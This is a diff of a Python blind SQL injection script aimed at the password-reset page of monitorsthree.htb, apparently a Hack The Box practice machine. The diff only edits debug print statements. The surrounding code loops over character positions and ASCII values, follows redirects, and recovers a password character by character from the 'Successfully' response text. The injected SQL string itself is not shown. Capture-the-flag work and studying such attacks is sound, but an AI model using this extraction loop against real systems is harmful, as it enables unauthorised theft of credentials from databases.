@@ -16,8 +16,7 @@ print("\n--+--  Starting on blind sql probe  --+--\n")
 # CHANGE -> change sqli on line 20 !!!!
 for i in range(1,25):
 	for char_dec in range(32,127):
-	#for char_dec in range(109,110):
-		print(f"..trying {i}st character {char_dec} or ",chr(char_dec))
+		#print(f"..trying {i}st character {char_dec} or ",chr(char_dec))
 		#time.sleep(2)
 		#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 		url="http://monitorsthree.htb/forgot_password.php"
@@ -43,16 +42,16 @@ for i in range(1,25):
 		#print(response.status_code)
 		#for header, value in response.headers.items():
 			#print(f"{header}: {value}")
-		if response.status_code == 302:  # HANDLE REDIRECT -> get Location -> combine with base url -> send .get request to redirect WITH headers and cookie!
+		if response.status_code == 302:
 			redirect_url = response.headers.get('Location')
 			redirect_url = "http://monitorsthree.htb" + redirect_url
-			print(f"Redirect occurred: {redirect_url}")
+			#print(f"Redirect occurred: {redirect_url}")
 			response = requests.get(redirect_url,headers=headers,verify=False)
 			
 		#print(response.text)
 		if('Successfully' in response.text):	#CHANGE -> based on response text on succesful guess
 			password.append(chr(char_dec))
-			print(f"found {i}-th char: ",chr(char_dec),"ASCII code: ",char_dec)
+			print(f"found {i}-th char:",chr(char_dec),"ASCII code:",char_dec)
 			break
 		
 		
